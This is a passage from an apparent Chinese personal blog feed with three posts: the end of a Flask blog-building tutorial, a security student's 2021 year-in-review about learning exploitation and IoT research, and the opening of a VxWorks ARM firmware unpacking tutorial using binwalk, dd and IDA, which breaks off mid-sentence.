href="#蓝图" class="headerlink" title="蓝图"></a>蓝图</h2><p>为了解耦，在视图上进行模块化，将同一类型的视图函数放在同一视图下，创建app/view.py，创建蓝图也很简单呐，只要调用Blueprint并将其赋值给一个变量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Blueprint</span><br><span class="line"></span><br><span class="line">user_bp = Blueprint(<span class="string">&#x27;user&#x27;</span>, __name__)</span><br></pre></td></tr></table></figure><p>接下来就可以通过在app/user/view.py中创建user_bp视图函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@user_bp.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line"><span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>最后在init.py注册蓝图可以了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">app.register_blueprint(user_bp)</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="博客"><a href="#博客" class="headerlink" title="博客"></a>博客</h2><p>在正式写代码之前，要理清楚博客中数据库的表的关系，之后只要按照搭建好的模型写代码了</p><p>需要构建的模型有用户，文章，文章分类：</p><table><thead><tr><th>一对多模型</th><th>多对多</th></tr></thead><tbody><tr><td>用户和文章</td><td>文章和分类</td></tr></tbody></table><p>这里仅搭建一个简易的模型，读者有兴趣可以接着往里面添加模型，还可添加评论，标签等，要想实现一对多，其实只需要一个外键，就可以通过用户找到文章，多对多即在外键的基础上加一个relationship就可以实现！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Categories</span>(<span class="params">db.Model</span>):</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line">    type_name = db.Column(db.String(<span class="number">20</span>), nullable=<span class="literal">True</span>)</span><br><span class="line">    article = db.relationship(<span class="string">&quot;Article&quot;</span>, backref=<span class="string">&quot;categories&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Article</span>(<span class="params">db.Model</span>):</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line">    title = db.Column(db.String(<span class="number">30</span>), nullable=<span class="literal">True</span>)</span><br><span class="line">    content = db.Column(db.Text, nullable=<span class="literal">True</span>)</span><br><span class="line">    brief = db.Column(db.Text, nullable=<span class="literal">True</span>)</span><br><span class="line">    pdatetime = db.Column(db.DateTime, default=datetime.now)</span><br><span class="line">    click_num = db.Column(db.Integer, default=<span class="number">0</span>)</span><br><span class="line">    love_num = db.Column(db.Integer, default=<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># foreignKey</span></span><br><span class="line">    user_id = db.Column(db.Integer, db.ForeignKey(<span class="string">&quot;user.id&quot;</span>), nullable=<span class="literal">True</span>)</span><br><span class="line">    type_id = db.Column(db.Integer, db.ForeignKey(<span class="string">&quot;categories.id&quot;</span>), nullable=<span class="literal">True</span>)</span><br><span class="line">    comment = db.relationship(<span class="string">&#x27;Comment&#x27;</span>, backref=<span class="string">&quot;article&quot;</span>)</span><br></pre></td></tr></table></figure><p>在之前的User模型添加：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>(<span class="params">db.Model</span>):</span></span><br><span class="line">...</span><br><span class="line">    icon = db.Column(db.String(<span class="number">40</span>))</span><br><span class="line">    rdatetime = db.Column(db.DateTime, default=datetime.now)</span><br><span class="line">    articles = db.relationship(<span class="string">&#x27;Article&#x27;</span>, backref=<span class="string">&quot;user&quot;</span>)</span><br></pre></td></tr></table></figure><p>模型也搭建完成了！</p><h3 id="美化"><a href="#美化" class="headerlink" title="美化"></a>美化</h3><p>因为只是建立一个简约的博客，所以用Bootstrap进行快速的开发，Flask也是有这类的插件，通过pip就能够安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install flask-bootstrap</span><br></pre></td></tr></table></figure><p>重新创建base.html，它继承bootstrap的模板，这样就能直接使用bootstrap的模板了，这里可以让所有页面继承导航栏navbar</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;%extends &quot;bootstrap/base.html&quot;%&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block title %&#125; &#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block styles %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block navbar %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>到<a href="https://v3.bootcss.com/components/#navbar">bootstrap的导航栏文档</a>去找个模板来修改，具体美化自行定制</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&#123;%extends &quot;bootstrap/base.html&quot;%&#125;</span><br><span class="line">&#123;% block title %&#125; &#123;% endblock %&#125;</span><br><span class="line">&#123;% block styles %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block navbar %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">&quot;navbar navbar-default&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container-fluid&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;navbar-header&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">class</span>=<span class="string">&quot;navbar-toggle collapsed&quot;</span> <span class="attr">data-toggle</span>=<span class="string">&quot;collapse&quot;</span> <span class="attr">data-target</span>=<span class="string">&quot;#bs-example-navbar-collapse-1&quot;</span> <span class="attr">aria-expanded</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;sr-only&quot;</span>&gt;</span>Toggle navigation<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;icon-bar&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;icon-bar&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;icon-bar&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;navbar-brand&quot;</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>ZYen Blog&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Collect the nav links, forms, and other content for toggling --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;collapse navbar-collapse&quot;</span> <span class="attr">id</span>=<span class="string">&quot;bs-example-navbar-collapse-1&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;nav navbar-nav&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;active&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>Home <span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>About<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>Categories<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="comment">&lt;!-- /.navbar-collapse --&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="comment">&lt;!-- /.container-fluid --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>接下来就是慢慢写视图函数，模板渲染的事情了，大体已经完成了！</p><img src="/2022/04/12/Flask-%C2%B7-%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%9E%84%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E6%98%93%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/11.png" class=""><p>到此，整个简易的个人博客已经搭建完成，其实还是有很多东西可以往里加，包括动态，搜索功能，后台，页面美化等，后期可能会再往里面加吧！</p><p><strong>github地址：<a href="https://github.com/ZYen12138/myblog">https://github.com/ZYen12138/myblog</a></strong></p>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开发日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021年度总结</title>
      <link href="/2022/02/13/2021%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
      <url>/2022/02/13/2021%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="2021年度总结"><a href="#2021年度总结" class="headerlink" title="2021年度总结"></a>2021年度总结</h1><ul><li><h2 id="梦的开始"><a href="#梦的开始" class="headerlink" title="梦的开始"></a>梦的开始</h2></li></ul><p>这一年或许是我进步最快的一年，对我来说是很魔幻的一年，可能我没想到自己还能做这么多事情，<br>在今年年初，觉得自己逆向逆不下去了，就开始转为PWN手，继续我的网络安全之路，但很不幸，我特别的急于求成，随便看了一下栈还没完全理解，就赶紧跑去学堆，因为我看到现在的比赛都是堆题，就是这种眼高手低的心态导致我的学习进度被拖了整整几个月的时间，但当时很幸运，还凭着一点逆向功底，只做出一道简单题，就入围了HWS硬件安全线下冬令营，说实话，这是迸发的起点，在这次冬令营里我认识到了很多大哥，他们对我后面的学习也有着很大的帮助，在这次冬令营我算是真正的见识到了IOT的魅力，但当时的我PWN技术还很弱，很多知识我都吸收不到，基本上算是走了一个过场就回去了，最后还捞了个阳光普照奖，报销了一半入营费，也是在这我认识到了一位某为的老师！</p><img src="/2022/02/13/2021%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/1-16447238368326.jpg" class=""><ul><li><h2 id="攻防演练"><a href="#攻防演练" class="headerlink" title="攻防演练"></a>攻防演练</h2></li></ul><p>虽说他曾经信誓旦旦的跟我说，”我以后拉你来某为实习”，他虽然没有兑现他的承诺，我也不能怪他，只能说自己的院校出身不太行，某天看到了可别喷….，这不是我一个人再说好吧，其他大厂我不清楚，但某为这几年是真的，尽管如此，他还是帮助我很多，比如帮我找了攻防演练的机会，如果没有他的帮助我可能那次真的去不了，web知识太薄弱了没办法没人要啊，最后靠着这点关系独自一个人去到外地，吃喝拉撒全都是自己一个人打算，那段时间真的很累，天天通宵，人差点通没了，不过那段时间也让我开始认真思考我的学习的路线，开始重新规划路线….</p><img src="/2022/02/13/2021%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/2-16447238328205.jpg" class=""><p>攻防演练回来之后有两个比赛进入线下了，好吧这算是跟学校同学第一次进入线下，但因为疫情原因全都取消了，改成线上，最后也没拿到任何奖，很难受，期间还有国赛的作品赛，某为的老师也带着我把课题完成了，虽然最后也没拿奖，不过从这起我的学习能力与思考有了一定的提升，也是因为这个我才能在后半年内收获很多东西！</p><ul><li><h2 id="重拾信心"><a href="#重拾信心" class="headerlink" title="重拾信心"></a>重拾信心</h2></li></ul><p>时间来到暑假，栈的内容学的差不多，堆的内容迟迟没有进度，导致这个暑假不知道学什么，因为不知道学了PWN，以后出去能干嘛？不务正业的学win的一些攻击手法去了，总的来说还是迷茫想找点事情做，紧接着HWS它又来了，这次很幸运，排名21，也顺利进入夏令营，这次夏令营对我来说真的是意义重大，暑假的时候不知道自己以后该做什么的时候，就想着捡起IOT这条路，但并不知道怎么入门，然后就弃坑了，才跑去win的，就是因为这次夏令营，轩哥系统的讲解，让我有了学习的材料，夏令营结束之后，按照轩哥说的一样，玩真实的设备，夏令营结束之后就买了rv110w，从零开始跟着轩哥的步伐一步步复现那个漏洞，最后写下《RV110W路由器漏洞复现》，写的挺完善的，也让我知道了，写的越多学的越快！<strong>这算是我自己的一个学习的方法吧！就是写写写，总结总结总结</strong>，尝到鲜之后从此开始烧钱之路，从各种路由器到各种硬件板卡，丝毫不吝啬，再复现了几个漏洞！，也慢慢开始审视自己，开始写周报，月报以及今天的年报，开始记录自己的学习之路！</p><img src="/2022/02/13/2021%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/3.png" class=""><ul><li><h2 id="开始输出"><a href="#开始输出" class="headerlink" title="开始输出"></a>开始输出</h2></li></ul><p>随着技术的进步，也慢慢得到一些人的认可，也可以开始独立备课讲课跟别人听，也是托天哥的福，受邀来到漏洞银行讲课，仿佛一环扣一环般慢慢进步，看着自己一步一步从无到有，从0到1，不容易不容易不容易：</p><img src="/2022/02/13/2021%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/4-16447238234763.jpg" class=""><ul><li><h2 id="生活中的小幸运"><a href="#生活中的小幸运" class="headerlink" title="生活中的小幸运"></a>生活中的小幸运</h2></li></ul><p>看到chamd5的IOT小组在招新，抱着试一试的心态投了简历，也很幸运的加入这个团队，在这个团队里认识了很多志同道合的朋友，有问必答，我在这里不断滋养，也很感谢m姐给我机会让我接触到这么多优秀的人，加入团队后我也开始努力输出，让我能够在这个团队里面待下去，参加比赛，投稿文章（很庆幸当时很勇敢的迈出了第一步投出第一份安全客的稿件，才让我后面有信心投稿下去），最后也让m姐看到我的输出没把我给踢出去哈哈哈</p><img src="/2022/02/13/2021%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/5-16447238179722.jpg" class=""><p>经过了一段的冷静期，这个学期也快要结束了，不过在最后还跟着澳哥去打了一波创安杯，有奖就是胜利！</p><img src="/2022/02/13/2021%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/6-16447238118281.jpg" class=""><p>学期结束之后，就来到杭州漂，也是第一次没有回家过年，一种说不出的感觉，也意识到，其实并没有很多人关心你吃年夜饭了没有，在这自己过年怎么样，只有父母和女朋友会关心关心（开始emo了），来到这说实话也慢慢知道，社会就是那么个社会，它和学校不一样就是不一样！别太信任别人！我记住了！</p><p>回看自己这一年的经历，就是学习能力与方法进步和不断的自我反思所形成的成果，感受到网安群其实说大不大，厉害的人来来去去就是那些人，每个阶段都有你接触到的人，他们的经历总是会打动你，影响你，然后变得更优秀，遇见更厉害的人，周而复返，最后你也可以成为别人口中的大哥！！！</p><h2 id="最后鸣谢（除了女朋友剩下的不分先后）"><a href="#最后鸣谢（除了女朋友剩下的不分先后）" class="headerlink" title="最后鸣谢（除了女朋友剩下的不分先后）"></a>最后鸣谢（除了女朋友剩下的不分先后）</h2><p>女朋友：在很多emo的时候，都会安慰我给我力量，在背后一直默默支持我，太爱了呜呜呜，我一定在继续努力，我们都有美好的未来！</p><p>天哥：真的给了我很多帮助，真的太感动了！为了这个团队做了太多东西，付出太多了！</p><p>m姐&amp;&amp;chamd5的小伙伴：在我有问题的时候去问的时候都会很耐心的回答我的问题！</p><p>某位不愿透露姓名的HWS冬令营的朋友：平时交流的时候就得到很多小tips啦！很舒服嘿嘿</p><p>LSF： web有问题问他就没错了，都会很耐心的回答</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>如何对ARM架构下的VxWorks系统固件进行修复？</title>
      <link href="/2022/02/04/%E5%A6%82%E4%BD%95%E5%AF%B9ARM%E6%9E%B6%E6%9E%84%E4%B8%8B%E7%9A%84VxWorks%E7%B3%BB%E7%BB%9F%E5%9B%BA%E4%BB%B6%E8%BF%9B%E8%A1%8C%E4%BF%AE%E5%A4%8D%EF%BC%9F/"/>
      <url>/2022/02/04/%E5%A6%82%E4%BD%95%E5%AF%B9ARM%E6%9E%B6%E6%9E%84%E4%B8%8B%E7%9A%84VxWorks%E7%B3%BB%E7%BB%9F%E5%9B%BA%E4%BB%B6%E8%BF%9B%E8%A1%8C%E4%BF%AE%E5%A4%8D%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<blockquote><p>随着学习的深入，接触的设备已经慢慢的从一些简单的路由器向其他的智能设备开始扩散，就会碰到更多看起来比较复杂的固件，就比如RTOS的固件，当用常规的方法—-binwalk对它进行解包的时候，并不能直接看见文件系统里面的内容，笔者一开始接触这类系统十分的困惑，在研究完修改的过程之后，记录一下学习的过程。</p></blockquote><h2 id="RTOS介绍"><a href="#RTOS介绍" class="headerlink" title="RTOS介绍"></a>RTOS介绍</h2><p>RTOS的全称为Real-time operating system，翻译过来就是实时操作系统的意思，这里的<strong>实时指的是某个程序的响应时间严格限制在某段时间内完成</strong>，简单来说，就是设置了一个坎，在时间结束之前必须跨过这个坎，建立这么一个基本的概念就算到位了，其实在现代的操作系统当中，除了某种特点的情况才需要用到RTOS，因为在硬件能力慢慢提升的情况下，这种差距就显得没有那么大，除非在AI，自动化，航空等领域，否则其他的情况，人们很难去感受到它们的差距在哪，更多详细的内容参考下面的链接：</p><ul><li><a href="https://zh.wikipedia.org/wiki/%E5%AE%9E%E6%97%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F">实时操作系统</a></li><li><a href="https://zhuanlan.zhihu.com/p/86861756">什么是实时操作系统（RTOS）</a></li><li><a href="https://techfactory.itmedia.co.jp/tf/articles/1705/17/news004.html">七大特性能看懂什么是RTOS</a></li></ul><p>总的来说，没有说实时操作系统和非实时操作系统的速度，吞吐量和规模一定谁比谁快，谁比谁精巧，只是在某种应用场景下，那种系统更加的符合应用场景就使用那种系统罢了</p><h2 id="开始修复固件"><a href="#开始修复固件" class="headerlink" title="开始修复固件"></a>开始修复固件</h2><p>此处用的是TP-LINK TL-WDR7660来练手，毕竟网上还是有点资料，出现问题也能参考参考，链接：</p><ul><li><a href="https://service.tp-link.com.cn/detail_download_7989.html">固件链接</a></li></ul><h3 id="固件分析"><a href="#固件分析" class="headerlink" title="固件分析"></a>固件分析</h3><p>先通过binwalk识别一下，识别到是uImage和一堆LZMA压缩过的数据，前者是U-boot，后者可能里面存在文件系统，其中比较大的很有可能就是文件系统，就比如0x10400这个，还有这是arm架构的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜   binwalk wdr7660gv1-cn-up_2019-08-30_10.37.02.bin</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">512           0x200           uImage header, header size: 64 bytes, header CRC: 0xDEFB3DA, created: 2018-09-05 07:32:57, image size: 48928 bytes, Data Address: 0x41C00000, Entry Point: 0x41C00000, data CRC: 0x2A36A3AD, OS: Firmware, CPU: ARM, image <span class="built_in">type</span>: Standalone Program, compression <span class="built_in">type</span>: lzma, image name: <span class="string">&quot;U-Boot 2014.04-rc1-gdbb6e75-dirt]&quot;</span></span><br><span class="line">576           0x240           LZMA compressed data, properties: 0x5D, dictionary size: 67108864 bytes, uncompressed size: -1 bytes</span><br><span class="line">66560         0x10400         LZMA compressed data, properties: 0x6E, dictionary size: 8388608 bytes, uncompressed size: 3869672 bytes</span><br><span class="line">1422400       0x15B440        LZMA compressed data, properties: 0x5A, dictionary size: 8388608 bytes, uncompressed size: 7170 bytes</span><br><span class="line">1423926       0x15BA36        LZMA compressed data, properties: 0x5A, dictionary size: 8388608 bytes, uncompressed size: 200 bytes</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="提取文件系统"><a href="#提取文件系统" class="headerlink" title="提取文件系统"></a>提取文件系统</h3><p>用dd命令提取，下面是它的命令解析：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bs=字节数      一次读写的比特数（默认：512）；</span><br><span class="line">count=块数     只将复制指定数量的输入块</span><br><span class="line">ibs=字节数     一次读取的字节数（默认：512)</span><br><span class="line"><span class="keyword">if</span>=文件         从指定文件而非标准输入来进行读取</span><br><span class="line">obs=字节数      一次写入指定字节数（默认：512）</span><br><span class="line">of=文件         写入到指定文件而非标准输出</span><br><span class="line">skip=块数       在输入开始处跳过指定的 ibs 大小的块数</span><br></pre></td></tr></table></figure><p>这里提一下count的计算：1422400-66560=1355840</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  dd <span class="keyword">if</span>=wdr7660gv1-cn-up_2019-08-30_10.37.02.bin of=ac7660.lzma bs=1 skip=66560 count=1355840</span><br><span class="line">记录了1355840+0 的读入</span><br><span class="line">记录了1355840+0 的写出</span><br><span class="line">1355840字节（1.4 MB，1.3 MiB）已复制，3.98426 s，340 kB/s</span><br></pre></td></tr></table></figure><p>但是解压有点问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  firware lzma -d ac76601.lzma </span><br><span class="line">lzma: ac76601.lzma: 压缩数据已损坏</span><br></pre></td></tr></table></figure><p>用010打开之后，发现后面有一段空数据，怀疑是空数据影响到了，重新计算长度，0x15a477-0x10400=0x14a077（1351799），重新提取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  dd <span class="keyword">if</span>=wdr7660gv1-cn-up_2019-08-30_10.37.02.bin of=ac7660.lzma bs=1 skip=66560 count=1351799</span><br><span class="line">记录了1351799+0 的读入</span><br><span class="line">记录了1351799+0 的写出</span><br><span class="line">1351799字节（1.4 MB，1.3 MiB）已复制，7.3005 s，185 kB/s</span><br><span class="line">➜  lzma -d ac7660.lzma </span><br></pre></td></tr></table></figure><p>再次binwalk获得信息，得知这是小端，所以确定这是ARM little的架构，或者直接采用binwalk -A来进行识别CPU的架构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  binwalk ac7660 | grep &quot;endian&quot;</span><br><span class="line">3728344       0x38E3D8        SHA256 hash constants, little endian</span><br><span class="line">3784928       0x39C0E0        SHA256 hash constants, little endian</span><br><span class="line">3847576       0x3AB598        CRC32 polynomial table, little endian</span><br><span class="line">➜  binwalk -A ac7660</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">84            0x54            ARM instructions, function prologue</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>打开IDA进行分析，设置Processor type为ARM Little-endian</p><img src="/2022/02/04/%E5%A6%82%E4%BD%95%E5%AF%B9ARM%E6%9E%B6%E6%9E%84%E4%B8%8B%E7%9A%84VxWorks%E7%B3%BB%E7%BB%9F%E5%9B%BA%E4%BB%B6%E8%BF%9B%E8%A1%8C%E4%BF%AE%E5%A4%8D%EF%BC%9F/1.jpg" class=""><p>之后就来到关键的第一步：定位程序入口点</p><h3 id="如何定位程序入口点"><a href="#如何定位程序入口点" class="headerlink" title="如何定位程序入口点"></a>如何定位程序入口点</h3><p>由于此文件是外部链接符号，导致只能用下面这种方法来确认程序的入口点，如果确定文件是内部链接符号，可以参考下面的链接进行定位：</p><ul><li><a href="https://paper.seebug.org/771/#1">基于 VxWorks 的嵌入式设备固件分析方法介绍</a></li></ul><p>上图确认之后，IDA会弹窗要选择入口地址，在不知道之前先填入0：</p><img src="/2022/02/04/%E5%A6%82%E4%BD%95%E5%AF%B9ARM%E6%9E%B6%E6%9E%84%E4%B8%8B%E7%9A%84VxWorks%E7%B3%BB%E7%BB%9F%E5%9B%BA%E4%BB%B6%E8%BF%9B%E8%A1%8C%E4%BF%AE%E5%A4%8D%EF%BC%9F/3.jpg" class=""><p>进来看到IDA开头，也就是ROM中地址0的位置，在此处全部转换成代码（按键c）</p><img src="/2022/02/04/%E5%A6%82%E4%BD%95%E5%AF%B9ARM%E6%9E%B6%E6%9E%84%E4%B8%8B%E7%9A%84VxWorks%E7%B3%BB%E7%BB%9F%E5%9B%BA%E4%BB%B6%E8%BF%9B%E8%A1%8C%E4%BF%AE%E5%A4%8D%EF%BC%9F/4.jpg" class=""><p>完成之后的结果如下，可以看到用红色框框住的数值就是VxWorks的程序入口点，为什么这么说呢？来看一下VxWorks的启动流程就明白了！</p><img src="/2022/02/04/%E5%A6%82%E4%BD%95%E5%AF%B9ARM%E6%9E%B6%E6%9E%84%E4%B8%8B%E7%9A%84VxWorks%E7%B3%BB%E7%BB%9F%E5%9B%BA%E4%BB%B6%E8%BF%9B%E8%A1%8C%E4%BF%AE%E5%A4%8D%EF%BC%9F/5.jpg" class=""><p>通过查阅资料得知，sysInit() 